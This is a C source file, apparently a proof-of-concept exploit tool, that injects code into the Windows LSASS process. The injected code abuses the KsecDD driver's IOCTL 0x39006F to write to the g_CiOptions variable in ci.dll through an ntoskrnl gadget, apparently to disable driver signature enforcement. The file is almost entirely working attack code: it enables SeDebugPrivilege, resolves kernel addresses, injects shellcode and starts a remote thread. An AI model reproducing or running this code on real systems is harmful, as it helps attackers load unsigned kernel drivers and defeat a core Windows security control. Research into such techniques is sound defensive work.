/*
* Angelo Frasca Caccia
* 30/05/2024
* https://www.github.com/Dsebler
*/


#include "Dsebler.h"


#pragma optimize ("", off)
BOOL WINAPI LsaKsec_SendIoctl()
{
	BOOL status = FALSE;
	IPC_SET_FUNCTION_RETURN_DEEP_PARAMETER InternalStruct = { 0x2121212121212121, 0x2222222222222222 };
	PIPC_SET_FUNCTION_RETURN_PARAMETER pParameterStruct = 0;
	PSYSTEM_HANDLE_INFORMATION pSystemHandleInformation = 0;
	POBJECT_NAME_INFORMATION pObjectNameInformation = 0;
	POBJECT_BASIC_INFORMATION pObjectBasicInformation = 0;
	ULONG szSystemInformationBuffer = sizeof(SYSTEM_HANDLE_INFORMATION), szObjectInformationBuffer = 0, iterator = 0;
	DWORD ObjectName[] = { 0x0044005c, 0x00760065, 0x00630069, 0x005c0065, 0x0073004b, 0x00630065, 0x00440044, 0x00000000 }; // L"\Device\KsecDD"

	pObjectBasicInformation = ((PLOCALALLOC)0x3131313131313131)(LPTR, sizeof(OBJECT_BASIC_INFORMATION));
	pParameterStruct = (PIPC_SET_FUNCTION_RETURN_PARAMETER)((PLOCALALLOC)0x3131313131313131)(LPTR, sizeof(IPC_SET_FUNCTION_RETURN_PARAMETER));
	
	if (pParameterStruct > 0)
	{
		pParameterStruct->pInternalStruct = &InternalStruct;
		pParameterStruct->rdx = (UINT16)0;

		while ((((PNTQUERYSYSTEMINFORMATION)0x4141414141414141)(0x10, (PVOID)pSystemHandleInformation, szSystemInformationBuffer, NULL)) != STATUS_SUCCESS)
		{
			if (pSystemHandleInformation)
			{
				((PLOCALFREE)0x3232323232323232)(pSystemHandleInformation);
				szSystemInformationBuffer *= 2;
			}
			pSystemHandleInformation = (PSYSTEM_HANDLE_INFORMATION)((PLOCALALLOC)0x3131313131313131)(LPTR, szSystemInformationBuffer);
			if (!pSystemHandleInformation)
			{
				break;
			}
		}

		if (pSystemHandleInformation)
		{
			for (iterator = 0; iterator < pSystemHandleInformation->HandleCount; iterator++)
			{
				if (pSystemHandleInformation->Handles[iterator].ProcessId == (ULONG)(*(PULONG)((PBYTE)__readgsqword(0x30) + 0x40)))
				{
					if (((PNTQUERYOBJECT)0x4242424242424242)((HANDLE)pSystemHandleInformation->Handles[iterator].Handle, ObjectBasicInformation, (PVOID)pObjectBasicInformation, sizeof(OBJECT_BASIC_INFORMATION), &szObjectInformationBuffer) == STATUS_SUCCESS)
					{
						if (!pObjectBasicInformation->NameInformationLength)
							szObjectInformationBuffer = MAX_PATH * sizeof(WCHAR);
						else
							szObjectInformationBuffer = pObjectBasicInformation->NameInformationLength;

						pObjectNameInformation = ((PLOCALALLOC)0x3131313131313131)(LPTR, (SIZE_T)szObjectInformationBuffer);
						if (pObjectNameInformation)
						{
							((PNTQUERYOBJECT)0x4242424242424242)((HANDLE)pSystemHandleInformation->Handles[iterator].Handle, 1, (PVOID)pObjectNameInformation, szObjectInformationBuffer, &szObjectInformationBuffer);
							if (pObjectNameInformation->Name.Buffer != NULL)
							{
								if (((PWCSCMP)0x3333333333333333)((wchar_t*)pObjectNameInformation->Name.Buffer, (wchar_t*)ObjectName) == 0)
								{
									status = ((PDEVICEIOCONTROL)0x4343434343434343)((HANDLE)pSystemHandleInformation->Handles[iterator].Handle, 0x39006F, (LPVOID)pParameterStruct, (DWORD)sizeof(IPC_SET_FUNCTION_RETURN_PARAMETER), NULL, 0, NULL, NULL);
									if (status)
									{
										break;
									}
								}
							}
							((PLOCALFREE)0x3232323232323232)(pObjectNameInformation);
						}
					}
				}
			}
			if (pObjectNameInformation)
			{
				((PLOCALFREE)0x3232323232323232)(pObjectNameInformation);
			}
			((PLOCALFREE)0x3232323232323232)(pSystemHandleInformation);
		}
		((PLOCALFREE)0x3232323232323232)(pParameterStruct);
	}
	if (pObjectBasicInformation)
	{
		((PLOCALFREE)0x3232323232323232)(pObjectBasicInformation);
	}

	return status;

}
BOOL WINAPI LsaKsec_SendIoctl_end()
{
	return 0;
}
#pragma optimize ("", on)

int main()
{
	WINDOWS_VERSION windows_version = WINDOWS_UNSUPPORTED;
	LPVOID RemoteHandler = 0, LocalHandler = 0;
	SIZE_T szRemoteHandler = (SIZE_T)((PBYTE)LsaKsec_SendIoctl_end - (PBYTE)LsaKsec_SendIoctl);
	UINT64 ntoskrnl_gadget = 0;
	UINT64 ci_g_cioptions = 0;
	HANDLE hProcess = 0, hThread = 0;
	REPLACEABLE_POINTER ReplPointers[] = {
		{ L"kernel32.dll", "DeviceIoControl", (PVOID)0x4343434343434343, NULL},
		{ L"kernel32.dll", "LocalAlloc", (PVOID)0x3131313131313131, NULL },
		{ L"kernel32.dll", "LocalFree", (PVOID)0x3232323232323232, NULL },
		{ L"ntdll.dll", "wcscmp", (PVOID)0x3333333333333333, NULL },
		{ L"ntdll.dll", "NtQuerySystemInformation", (PVOID)0x4141414141414141, NULL },
		{ L"ntdll.dll", "NtQueryObject", (PVOID)0x4242424242424242, NULL },
		{ NULL, NULL, (PVOID)0x2121212121212121, NULL }, // gadget
		{ NULL, NULL, (PVOID)0x2222222222222222, NULL } // g_cioptions
	};
	DWORD FakePtrsCount = sizeof(ReplPointers) / sizeof(REPLACEABLE_POINTER), i = 0, lsa = 0;
	
	windows_version = GetOsBuildNumber();
	lsa = GetLsaProcessId();
	if ((NTOSKRNL_GADGET_OFFSET[windows_version] == 0x00) || (CI_G_CIOPTIONS_OFFSET[windows_version] == 0x00))
	{
		PRINT_ERROR(L"OS is not supported.\n");
		return 0;
	}
	else if (!EnablePrivilege(L"SeDebugPrivilege"))
	{
		PRINT_ERROR(L"SeDebugPrivilege - %08x\n", GetLastError());
		return 0;
	}
	else if (!lsa)
	{
		PRINT_ERROR(L"LSASS process ID not found.\n");
		return 0;
	}

	ntoskrnl_gadget = (UINT64)((PBYTE)GetDriverBaseAddress("ntoskrnl.exe") + NTOSKRNL_GADGET_OFFSET[windows_version]);
	ci_g_cioptions = (UINT64)((PBYTE)GetDriverBaseAddress("ci.dll") + CI_G_CIOPTIONS_OFFSET[windows_version]);
	
	if ((ntoskrnl_gadget > NTOSKRNL_GADGET_OFFSET[windows_version]) && (ci_g_cioptions > CI_G_CIOPTIONS_OFFSET[windows_version]))
	{
		PRINT_SUCCESS(L"ntoskrnl gadget\t- 0x%-016p\n", (PVOID)ntoskrnl_gadget);
		PRINT_SUCCESS(L"g_cioptions\t- 0x%-016p\n", (PVOID)ci_g_cioptions);
		for (i = 0; i < FakePtrsCount; i++)
		{
			if (ReplPointers[i].FakePtr == (PVOID)0x2121212121212121)
				ReplPointers[i].RealPtr = (PVOID)ntoskrnl_gadget;
			if (ReplPointers[i].FakePtr == (PVOID)0x2222222222222222)
				ReplPointers[i].RealPtr = (PVOID)ci_g_cioptions;
		}
		
		hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, FALSE, lsa);
		if ((hProcess != INVALID_HANDLE_VALUE) && (hProcess != 0))
		{
			PRINT_SUCCESS(L"lsass pid %d successfully opened.\n", lsa);
			LocalHandler = (LPVOID)LocalAlloc(LPTR, szRemoteHandler);
			if (LocalHandler)
			{
				RtlCopyMemory(LocalHandler, LsaKsec_SendIoctl, szRemoteHandler);
				RemoteHandler = ReplaceFakePointers(hProcess, LocalHandler, (DWORD)szRemoteHandler, (PREPLACEABLE_POINTER)&ReplPointers, FakePtrsCount);
				if (RemoteHandler != NULL)
				{
					PRINT_SUCCESS(L"Remote handler successfully injected.\n");
					hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)RemoteHandler, NULL, 0, NULL);
					if ((hThread != INVALID_HANDLE_VALUE) && (hThread != 0))
					{
						PRINT_SUCCESS(L"Remote thread successfully created.\n");
						WaitForSingleObject(hThread, INFINITE);
						CloseHandle(hThread);
					}
					else
						PRINT_ERROR(L"Remote thread failure.\n");

					if (VirtualFreeEx(hProcess, RemoteHandler, 0, MEM_RELEASE))
						PRINT_SUCCESS(L"Target process cleaning success.\n");
					else
						PRINT_ERROR(L"Attempted to clean target process.\n");
				}
				else
					PRINT_ERROR(L"Handler injection error.\n");

				LocalFree(LocalHandler);
			}

			CloseHandle(hProcess);
		}
		else
			PRINT_ERROR(L"lsass - %08x\n", GetLastError());
	}

	return 0;

}